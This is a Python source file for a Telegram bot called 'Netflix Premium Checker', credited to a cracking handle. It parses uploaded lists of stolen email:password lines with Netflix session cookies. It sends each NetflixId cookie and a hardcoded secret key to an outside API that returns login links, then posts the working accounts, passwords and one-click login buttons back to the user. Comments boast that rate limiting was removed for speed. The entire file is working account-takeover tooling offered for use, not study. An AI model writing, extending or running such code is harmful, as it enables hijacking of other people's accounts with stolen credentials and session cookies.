import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI3DAY_d5Cl7U5mpXy2DL2ZrwS0Go47PCNYdjqB"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== NO RATE LIMITING - COMPLETELY REMOVED ====================
# All rate limit functions and checks have been removed
# The bot will process accounts as fast as possible

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== MULTI-LANGUAGE SUPPORT ====================

LANGUAGES = {
    'en': {
        'name': 'English',
        'flag': '🇺🇸',
        'welcome': 'Welcome',
        'start': 'Start',
        'help': 'Help',
        'stats': 'Statistics',
        'clear': 'Clear',
        'language': 'Language',
        'processing': 'Processing',
        'valid': 'VALID',
        'invalid': 'INVALID',
        'email': 'Email',
        'password': 'Password',
        'country': 'Country',
        'phone': 'Phone',
        'plan': 'Plan',
        'quality': 'Quality',
        'streams': 'Max Streams',
        'login_link': 'Login Link',
        'launch': '🎬 LAUNCH NETFLIX',
        'powered_by': 'Powered by',
        'file_received': 'FILE RECEIVED',
        'analyzing': 'ANALYZING FILE',
        'complete': 'PROCESSING COMPLETE',
        'results': 'RESULTS SUMMARY',
        'valid_found': 'Valid Accounts Found',
        'invalid_found': 'Invalid Accounts',
        'success_rate': 'Success Rate',
        'no_valid': 'No valid accounts found',
        'error_occurred': 'ERROR OCCURRED',
        'wrong_format': 'Please upload a .txt file',
        'no_cookies': 'No Netflix cookies found',
    },
    'zh': {
        'name': '中文',
        'flag': '🇨🇳',
        'welcome': '欢迎',
        'start': '开始',
        'help': '帮助',
        'stats': '统计',
        'clear': '清除',
        'language': '语言',
        'processing': '处理中',
        'valid': '有效',
        'invalid': '无效',
        'email': '邮箱',
        'password': '密码',
        'country': '国家',
        'phone': '电话',
        'plan': '套餐',
        'quality': '画质',
        'streams': '最大流',
        'login_link': '登录链接',
        'launch': '🎬 启动NETFLIX',
        'powered_by': '技术支持',
        'file_received': '已接收文件',
        'analyzing': '分析文件中',
        'complete': '处理完成',
        'results': '结果总结',
        'valid_found': '有效账户',
        'invalid_found': '无效账户',
        'success_rate': '成功率',
        'no_valid': '未找到有效账户',
        'error_occurred': '发生错误',
        'wrong_format': '请上传.txt文件',
        'no_cookies': '未找到Netflix cookies',
    },
    'km': {
        'name': 'ខ្មែរ',
        'flag': '🇰🇭',
        'welcome': 'ស្វាគមន៍',
        'start': 'ចាប់ផ្តើម',
        'help': 'ជំនួយ',
        'stats': 'ស្ថិតិ',
        'clear': 'សម្អាត',
        'language': 'ភាសា',
        'processing': 'កំពុងដំណើរការ',
        'valid': 'ត្រឹមត្រូវ',
        'invalid': 'មិនត្រឹមត្រូវ',
        'email': 'អ៊ីមែល',
        'password': 'ពាក្យសម្ងាត់',
        'country': 'ប្រទេស',
        'phone': 'ទូរស័ព្ទ',
        'plan': 'កញ្ចប់',
        'quality': 'គុណភាព',
        'streams': 'ស្ទ្រីមអតិបរមា',
        'login_link': 'តំណចូល',
        'launch': '🎬 ចូល NETFLIX',
        'powered_by': 'ដំណើរការដោយ',
        'file_received': 'បានទទួលឯកសារ',
        'analyzing': 'កំពុងវិភាគឯកសារ',
        'complete': 'ដំណើរការបានបញ្ចប់',
        'results': 'សង្ខេបលទ្ធផល',
        'valid_found': 'គណនីត្រឹមត្រូវ',
        'invalid_found': 'គណនីមិនត្រឹមត្រូវ',
        'success_rate': 'អត្រាជោគជ័យ',
        'no_valid': 'រកមិនឃើញគណនីត្រឹមត្រូវទេ',
        'error_occurred': 'មានបញ្ហា',
        'wrong_format': 'សូមផ្ញើឯកសារ .txt',
        'no_cookies': 'រកមិនឃើញ Netflix cookies ទេ',
    }
}

# ==================== UNIVERSAL MULTI-FORMAT PARSER ====================

def decode_special_chars(text):
    """Decode special characters like \x20, \x28, \x29 into normal text"""
    if not text:
        return text
    
    replacements = {
        r'\x20': ' ', r'\x28': '(', r'\x29': ')', r'\x26': '&',
        r'\x3D': '=', r'\x2C': ',', r'\x2E': '.', r'\x2D': '-',
        r'\x5F': '_', r'\x2F': '/', r'\x5C': '\\', r'\x3A': ':',
        r'\x3B': ';', r'\x40': '@', r'\x23': '#', r'\x24': '$',
        r'\x25': '%', r'\x2B': '+', r'\x3C': '<', r'\x3E': '>',
        r'\x7B': '{', r'\x7D': '}', r'\x5B': '[', r'\x5D': ']',
        r'\x7C': '|', r'\x60': '`', r'\x27': "'", r'\x22': '"',
    }
    
    for encoded, decoded in replacements.items():
        text = text.replace(encoded, decoded)
    
    return text

def remove_emoji(text):
    """Remove emoji characters from text"""
    if not text:
        return text
    
    emoji_pattern = re.compile("["
        u"\U0001F600-\U0001F64F" u"\U0001F300-\U0001F5FF" u"\U0001F680-\U0001F6FF"
        u"\U0001F1E0-\U0001F1FF" u"\U00002702-\U000027B0" u"\U000024C2-\U0001F251"
        u"\U0001F900-\U0001F9FF" u"\U0001FA70-\U0001FAFF" u"\U00002600-\U000026FF"
        u"\U00002B50-\U00002B55" u"\U0001F004-\U0001F0CF" u"\U0001F170-\U0001F251"
        u"\U0001F201-\U0001F21A" u"\U0001F232-\U0001F23B" u"\U0001F250-\U0001F251"
        u"\U0001F300-\U0001F5FF" u"\U0001F600-\U0001F64F" u"\U0001F680-\U0001F6FF"
        u"\U0001F900-\U0001F9FF" u"\U0001FA70-\U0001FAFF" u"\U00002600-\U000026FF"
        u"\U00002700-\U000027BF" u"\U0001F1E6-\U0001F1FF"
        "]+", flags=re.UNICODE)
    
    return emoji_pattern.sub(r'', text).strip()

def parse_account_line(line):
    """
    Universal parser that handles multiple formats
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # Decode special characters
        line = decode_special_chars(line)
        
        # Split by |
        fields = line.split('|')
        
        # First field contains email:password
        first_field = fields[0].strip()
        if ':' in first_field:
            email_pass = first_field.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        
        # Parse remaining fields
        for field in fields[1:]:
            field = field.strip()
            if not field:
                continue
            
            separator = ':'
            if ':' not in field and '=' in field:
                separator = '='
            elif ':' not in field:
                continue
            
            if separator in field:
                key, value = field.split(separator, 1)
                key = key.strip().lower()
                value = value.strip()
                
                if 'country' in key:
                    account['country'] = remove_emoji(value)
                elif 'phone' in key:
                    account['phone'] = value
                elif 'plan' in key:
                    account['plan'] = value
                elif 'quality' in key or 'video' in key:
                    account['quality'] = value
                elif 'stream' in key or 'max' in key:
                    account['max_streams'] = value
                elif 'cookie' in key or 'netflixcookies' in key:
                    account['full_cookie'] = value
                    netflix_match = re.search(r'NetflixId=([^&\s]+)', value)
                    if netflix_match:
                        account['netflix_id'] = netflix_match.group(1).strip()
        
        if 'netflix_id' not in account:
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email):
    """Check Netflix ID using YOUR API"""
    
    if not netflix_id:
        return {"success": False, "error": "No Netflix ID", "email": email}
    
    try:
        url = f"{API_URL}/api/gen"
        data = {"netflix_id": netflix_id, "secret_key": SECRET_KEY}
        
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                return {"success": True, "login_url": login_url, "email": email}
            else:
                return {"success": False, "error": "No login URL", "email": email}
        else:
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            error_messages = {
                'INVALID_RESPONSE_FORMAT': "Netflix ID is invalid or expired",
                'INVALID_NETFLIX_ID': "Netflix ID is invalid or expired",
                'SERVER_ERROR': "Netflix server error",
            }
            
            user_message = error_messages.get(error_code, f"Error: {error_msg}")
            
            return {"success": False, "error": user_message, "email": email}
                
    except Exception as e:
        return {"success": False, "error": str(e), "email": email}

# ==================== LANGUAGE SELECTION ====================

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show language selection menu"""
    keyboard = [
        [InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
         InlineKeyboardButton(f"{LANGUAGES['zh']['flag']} 中文", callback_data='lang_zh')],
        [InlineKeyboardButton(f"{LANGUAGES['km']['flag']} ខ្មែរ", callback_data='lang_km')]
    ]
    
    await update.message.reply_text(
        "🌐 **Select your language / 选择语言 / ជ្រើសរើសភាសា**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    lang_code = query.data.replace('lang_', '')
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['language'] = lang_code
    
    lang = LANGUAGES[lang_code]
    
    await query.edit_message_text(
        f"✅ **{lang['flag']} {lang['name']} selected!**\n\nUse /start to begin.",
        parse_mode='Markdown'
    )

def get_lang(user_id):
    """Get user's selected language"""
    if user_id in user_sessions and 'language' in user_sessions[user_id]:
        return user_sessions[user_id]['language']
    return 'en'

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    user_id = user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    welcome = f"""
╔══════════════════════════════════════════╗
║     🎬 **NETFLIX PREMIUM CHECKER** 🎬    ║
║          {lang['flag']} {lang['name']} version          ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌟 **{lang['welcome']} {user.first_name}!** 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **Send a .txt file** with accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Supports multiple formats
✅ NO rate limits - processes instantly
✅ Multi-language support

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - {lang['help']} ℹ️
/stats - {lang['stats']} 📊
/language - {lang['language']} 🌐
/clear - {lang['clear']} 🧹

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    help_text = f"""
╔══════════════════════════════════════════╗
║            🆘 **{lang['help']}** 🆘            ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • One account per line
   • Use `|` to separate fields
   • Must include Cookie with NetflixId=

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **SUPPORTED FORMATS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`email:password | Country = United States 🇺🇸 | Cookie: NetflixId=...`

`email:password | Phone: +1234567890 | Country: United States | Cookie: NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    stats_text = f"""
╔══════════════════════════════════════════╗
║        📊 **{lang['stats']}** 📊        ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **{lang['valid_found']}:** `{valid_accounts}`
• **{lang['invalid_found']}:** `{invalid_accounts}`
• **Total Checks:** `{total_checks}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    if user_id in user_sessions:
        lang_pref = user_sessions[user_id].get('language', 'en')
        user_sessions[user_id] = {'language': lang_pref}
    
    await update.message.reply_text(f"✅ **{lang['clear']}**\n\nYou can now upload a new file.", parse_mode='Markdown')

# ==================== FILE HANDLER - NO RATE LIMITS ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files - NO RATE LIMITS, processes instantly"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(f"❌ **{lang['wrong_format']}**", parse_mode='Markdown')
        return
    
    # Start processing immediately
    status_msg = await update.message.reply_text(f"📥 **{lang['file_received']}** - Downloading...", parse_mode='Markdown')
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await status_msg.edit_text(f"📊 **{lang['analyzing']}** - Found {len(accounts)} accounts", parse_mode='Markdown')
        
        valid_count = 0
        invalid_count = 0
        
        # Process ALL accounts immediately - NO DELAYS
        for i, line in enumerate(accounts, 1):
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                continue
            
            # Update status every few accounts
            if i % 5 == 0 or i == len(accounts):
                await status_msg.edit_text(f"🔄 Processing {i}/{len(accounts)} - Valid: {valid_count}", parse_mode='Markdown')
            
            # Check with API
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Send valid account immediately
                details = []
                if account.get('country'):
                    details.append(f"🌍 **{lang['country']}:** `{account['country']}`")
                if account.get('phone'):
                    details.append(f"📞 **{lang['phone']}:** `{account['phone']}`")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨
     ⭐ **{lang['valid']} ACCOUNT #{valid_count}** ⭐     
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨

📧 **{lang['email']}:** `{account['email']}`
🔑 **{lang['password']}:** `{account.get('password', 'N/A')}`
{details_str}

🔗 **{lang['login_link']}:**
`{result['login_url']}`

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
                """
                
                keyboard = [[InlineKeyboardButton(lang['launch'], url=result['login_url'])]]
                await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                
            else:
                invalid_count += 1
                invalid_accounts += 1
        
        # Final summary
        if valid_count > 0:
            await status_msg.edit_text(f"✅ **Complete!** Found {valid_count} valid accounts.", parse_mode='Markdown')
        else:
            await status_msg.edit_text(f"❌ **{lang['no_valid']}**", parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ **{lang['error_occurred']}**\n\n`{str(e)[:100]}`", parse_mode='Markdown')

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot - NO RATE LIMITS"""
    print("=" * 60)
    print("🎬 NETFLIX PREMIUM CHECKER BOT - UNLIMITED SPEED")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("⚡ NO RATE LIMITS - PROCESSING AT MAXIMUM SPEED")
    print("🌐 Languages: English, 中文, ខ្មែរ")
    print("=" * 60)
    
    # Simple app builder - no rate limiters
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
